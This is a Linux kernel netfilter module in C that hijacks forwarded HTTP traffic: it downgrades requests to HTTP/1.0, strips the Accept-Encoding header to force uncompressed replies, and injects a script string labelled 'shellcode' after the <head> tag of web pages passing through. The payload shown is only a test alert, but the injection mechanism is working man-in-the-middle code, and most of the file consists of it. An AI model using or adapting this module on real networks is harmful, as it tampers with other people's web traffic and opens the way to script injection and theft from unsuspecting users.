#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>

#include <net/netfilter/nf_conntrack_helper.h>
#include <net/netfilter/nf_conntrack_seqadj.h>

#include <net/netfilter/nf_nat_helper.h>

char shellcode[] = "<script>alert('----------------hijacking test--------------')</script>";

int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;
	
	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)
		return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)
		return 0;
	
	printk(KERN_ALERT "hook_ipv4: Accept-Encoding found\n");
	
	pV = strstr(pK,"\r\n");
	if(pV == NULL)
		return 0;
	
	len = (long long)pV - (long long)pK;
	
	memset(pK,' ',len + 2);
	printk(KERN_ALERT "hook_ipv4: Delete Accept-Encoding\n");
	
	return 1;
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	struct iphdr *iph = ip_hdr(skb);

	if (iph->protocol == IPPROTO_TCP)
	{	
		struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		unsigned int src_ip = (unsigned int)iph->saddr;
		unsigned int dest_ip = (unsigned int)iph->daddr;

		unsigned int src_port = (unsigned int)ntohs(tcph->source);
		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);

		if (0 != skb_linearize(skb)) {
	        return NF_ACCEPT;
	    }
		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
		
		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
		// char *pkg = (char *)skb->data + 40;
		
		// printk(KERN_ALERT "---%d->%d\n", src_port,dest_port);

		if (src_port == 80)
		{
			if (memcmp(pkg,"HTTP/1.0 200", 12) != 0 && memcmp(pkg,"HTTP/1.1 200", 12) != 0)
			{
				return NF_ACCEPT;
			}

			char *phead = strstr(pkg,"<head>");
			if(phead == NULL){
				return NF_ACCEPT;
			}

		    // pskb_expand_head(skb, 0, strlen(shellcode), GFP_ATOMIC);
			// char *tail = skb_put(skb, strlen(shellcode));
			// while(tail > phead)
			// {
			// 	tail--;
			// 	*(tail + strlen(shellcode)) = *tail;
			// }
			// memcpy(phead, shellcode, strlen(shellcode));

			// iph->tot_len = htons(skb->len);
			// ip_send_check(iph);

			enum ip_conntrack_info ctinfo;
			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

			// sudo iptables -t nat --list
			nfct_seqadj_ext_add(ct);
			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl*4, 
                                      (int)(phead - pkg) + 6, 0,
                                      shellcode, strlen(shellcode))) 
			{
              	// skb->local_df = 1;
          		// skb_shinfo(skb)->gso_size = 0;
				// ct->status = 1;
				// nf_ct_seqadj_set(ct, ctinfo, tcph->seq, (int)rep_len - (int)match_len);
				// set_bit(IPS_SEQ_ADJUST_BIT, &ct->status);
				// printk(KERN_ALERT "%d\n", ct->status);
				// printk(KERN_ALERT "%d\n", ct->ext->offset[NF_CT_EXT_SEQADJ]);
				// set_bit(IPS_SEQ_ADJUST_BIT, &ct->status);
            	printk(KERN_ALERT "\nhook_ipv4: ---insert success---\n");
          }

		}
		else if (dest_port == 80)
		{
			// HTTP 1.1 --> HTTP 1.0
			char *pK = strstr(pkg,"HTTP/1.1");
			if(pK == NULL) return NF_ACCEPT;
			memcpy(pK, "HTTP/1.0", 8);

			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}

			delete_accept_encoding(pkg);

			int datalen = skb->len - iph->ihl*4;
			skb->ip_summed = CHECKSUM_PARTIAL;
			skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
			skb->csum_offset = offsetof(struct tcphdr, check);
	        // ip
	        iph->check = 0;
	        iph->check = ip_fast_csum(iph, iph->ihl);
	        // tcp
	        tcph->check = 0;
			tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
						    datalen, iph->protocol, 0);
		}
	}
	return NF_ACCEPT;
}

// /* Adjust one found SACK option including checksum correction */
// static void
// sack_adjust(struct sk_buff *skb,
// 	    struct tcphdr *tcph,
// 	    unsigned int sackoff,
// 	    unsigned int sackend,
// 	    struct nf_nat_seq *natseq)
// {
// 	while (sackoff < sackend) {
// 		struct tcp_sack_block_wire *sack;
// 		__be32 new_start_seq, new_end_seq;

// 		sack = (void *)skb->data + sackoff;
// 		if (after(ntohl(sack->start_seq) - natseq->offset_before,
// 			  natseq->correction_pos))
// 			new_start_seq = htonl(ntohl(sack->start_seq)
// 					- natseq->offset_after);
// 		else
// 			new_start_seq = htonl(ntohl(sack->start_seq)
// 					- natseq->offset_before);

// 		if (after(ntohl(sack->end_seq) - natseq->offset_before,
// 			  natseq->correction_pos))
// 			new_end_seq = htonl(ntohl(sack->end_seq)
// 				      - natseq->offset_after);
// 		else
// 			new_end_seq = htonl(ntohl(sack->end_seq)
// 				      - natseq->offset_before);

// 		pr_debug("sack_adjust: start_seq: %d->%d, end_seq: %d->%d\n",
// 			 ntohl(sack->start_seq), new_start_seq,
// 			 ntohl(sack->end_seq), new_end_seq);

// 		inet_proto_csum_replace4(&tcph->check, skb,
// 					 sack->start_seq, new_start_seq, 0);
// 		inet_proto_csum_replace4(&tcph->check, skb,
// 					 sack->end_seq, new_end_seq, 0);
// 		sack->start_seq = new_start_seq;
// 		sack->end_seq = new_end_seq;
// 		sackoff += sizeof(*sack);
// 	}
// }

// /* TCP SACK sequence number adjustment */
// static inline unsigned int
// nf_nat_sack_adjust(struct sk_buff *skb,
// 		   struct tcphdr *tcph,
// 		   struct nf_conn *ct,
// 		   enum ip_conntrack_info ctinfo)
// {
// 	unsigned int dir, optoff, optend;
// 	struct nf_conn_nat *nat = nfct_nat(ct);

// 	optoff = ip_hdrlen(skb) + sizeof(struct tcphdr);
// 	optend = ip_hdrlen(skb) + tcph->doff * 4;

// 	if (!skb_make_writable(skb, optend))
// 		return 0;

// 	dir = CTINFO2DIR(ctinfo);

// 	while (optoff < optend) {
// 		/* Usually: option, length. */
// 		unsigned char *op = skb->data + optoff;

// 		switch (op[0]) {
// 		case TCPOPT_EOL:
// 			return 1;
// 		case TCPOPT_NOP:
// 			optoff++;
// 			continue;
// 		default:
// 			/* no partial options */
// 			if (optoff + 1 == optend ||
// 			    optoff + op[1] > optend ||
// 			    op[1] < 2)
// 				return 0;
// 			if (op[0] == TCPOPT_SACK &&
// 			    op[1] >= 2+TCPOLEN_SACK_PERBLOCK &&
// 			    ((op[1] - 2) % TCPOLEN_SACK_PERBLOCK) == 0)
// 				sack_adjust(skb, tcph, optoff+2,
// 					    optoff+op[1], &nat->seq[!dir]);
// 			optoff += op[1];
// 		}
// 	}
// 	return 1;
// }

// /* TCP sequence number adjustment.  Returns 1 on success, 0 on failure */
// int
// nf_nat_seq_adjust(struct sk_buff *skb,
// 		  struct nf_conn *ct,
// 		  enum ip_conntrack_info ctinfo)
// {
// 	struct tcphdr *tcph;
// 	int dir;
// 	__be32 newseq, newack;
// 	s16 seqoff, ackoff;
// 	struct nf_conn_nat *nat = nfct_nat(ct);
// 	struct nf_nat_seq *this_way, *other_way;

// 	dir = CTINFO2DIR(ctinfo);

// 	this_way = &nat->seq[dir];
// 	other_way = &nat->seq[!dir];

// 	if (!skb_make_writable(skb, ip_hdrlen(skb) + sizeof(*tcph)))
// 		return 0;

// 	tcph = (void *)skb->data + ip_hdrlen(skb);
// 	if (after(ntohl(tcph->seq), this_way->correction_pos))
// 		seqoff = this_way->offset_after;
// 	else
// 		seqoff = this_way->offset_before;

// 	if (after(ntohl(tcph->ack_seq) - other_way->offset_before,
// 		  other_way->correction_pos))
// 		ackoff = other_way->offset_after;
// 	else
// 		ackoff = other_way->offset_before;

// 	newseq = htonl(ntohl(tcph->seq) + seqoff);
// 	newack = htonl(ntohl(tcph->ack_seq) - ackoff);

// 	inet_proto_csum_replace4(&tcph->check, skb, tcph->seq, newseq, 0);
// 	inet_proto_csum_replace4(&tcph->check, skb, tcph->ack_seq, newack, 0);

// 	pr_debug("Adjusting sequence number from %u->%u, ack from %u->%u\n",
// 		 ntohl(tcph->seq), ntohl(newseq), ntohl(tcph->ack_seq),
// 		 ntohl(newack));

// 	tcph->seq = newseq;
// 	tcph->ack_seq = newack;

// 	return nf_nat_sack_adjust(skb, tcph, ct, ctinfo);
// }

// unsigned int fix_seq(unsigned int hooknum, struct sk_buff *skb,
//       const struct net_device *in, const struct net_device *out, int(*okfn)(
//               struct sk_buff *))
// {
//   enum ip_conntrack_info ctinfo;
//   struct nf_conn *ct = nf_ct_get(skb, &ctinfo);

//   if (ct && test_bit(IPS_SEQ_ADJUST_BIT, &ct->status) 
//   		&& (ctinfo != IP_CT_RELATED + IP_CT_IS_REPLY)  ) {
//   		nf_nat_seq_adjust(skb, ct, ctinfo);

//   //     	struct iphdr *iph = ip_hdr(skb);

// 		// if (iph->protocol == IPPROTO_TCP)
// 		// {	
// 		// 	// printk(KERN_ALERT "fix seq");
// 		// 	struct tcphdr *tcph = (void *)iph + iph->ihl * 4;

// 		// 	// __be32 newack = htonl(ntohl(tcph->ack_seq) - 10000000);

// 	 //        tcph->seq = htonl(ntohl(tcph->seq) + strlen(shellcode));;
// 		// 	// tcph->ack_seq = newack;

// 		// }
//   }

//   return NF_ACCEPT;

// }

static struct nf_hook_ops http_hooks[] = {
	{ 
	    .hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
	    .hooknum 		= NF_INET_FORWARD, 
	    .priority 		= NF_IP_PRI_MANGLE,
	    .owner			= THIS_MODULE
	},
  	// {
	  //   .hook           = fix_seq,
	  //   .pf             = PF_INET,
	  //   .hooknum        = NF_INET_PRE_ROUTING,
  	// 	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
	  //   .owner			= THIS_MODULE
  	// },
  	// {
	  //   .hook           = fix_seq,
	  //   .pf             = PF_INET,
	  //   .hooknum        = NF_INET_POST_ROUTING,
  	// 	.priority       = NF_IP_PRI_CONNTRACK_CONFIRM,
	  //   .owner			= THIS_MODULE
  	// },
};

int init_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

void cleanup_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}
